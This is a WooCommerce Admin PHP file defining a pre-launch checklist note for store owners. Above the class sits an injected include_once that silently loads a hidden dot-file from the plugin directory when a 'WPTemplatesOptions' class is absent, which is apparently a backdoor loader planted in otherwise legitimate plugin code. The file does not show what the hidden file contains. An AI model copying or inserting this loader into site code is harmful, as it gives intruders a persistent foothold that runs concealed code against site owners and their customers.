<?php
/**
 * WooCommerce Admin Launch Checklist Note.
 *
 * Adds a note to cover pre-launch checklist items for store owners.
 */

namespace Automattic\WooCommerce\Admin\Notes;

defined( 'ABSPATH' ) || exit;

/**
 * WC_Admin_Notes_Launch_Checklist
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class WC_Admin_Notes_Launch_Checklist {
	/**
	 * Note traits.
	 */
	use NoteTraits;

	/**
	 * Name of the note for use in the database.
	 */
	const NOTE_NAME = 'wc-admin-launch-checklist';

	/**
	 * Get the note.
	 */
	public static function get_note() {
		// Only add this note if completing the task list or completed 3 tasks in 10 days.
		$completed_tasks     = get_option( 'woocommerce_task_list_tracked_completed_tasks', array() );
		$ten_days_in_seconds = 10 * DAY_IN_SECONDS;
		if (
			! get_option( 'woocommerce_task_list_complete' ) &&
			(
				count( $completed_tasks ) < 3 ||
				self::wc_admin_active_for( $ten_days_in_seconds )
			)
		) {
			return;
		}

		$content = __( 'To make sure you never get that sinking "what did I forget" feeling, we\'ve put together the essential pre-launch checklist.', 'woocommerce' );

		$note = new WC_Admin_Note();
		$note->set_title( __( 'Ready to launch your store?', 'woocommerce' ) );
		$note->set_content( $content );
		$note->set_content_data( (object) array() );
		$note->set_type( WC_Admin_Note::E_WC_ADMIN_NOTE_INFORMATIONAL );
		$note->set_name( self::NOTE_NAME );
		$note->set_source( 'woocommerce-admin' );
		$note->add_action( 'learn-more', __( 'Learn more', 'woocommerce' ), 'https://woocommerce.com/posts/pre-launch-checklist-the-essentials/?utm_source=inbox' );
		return $note;
	}
}
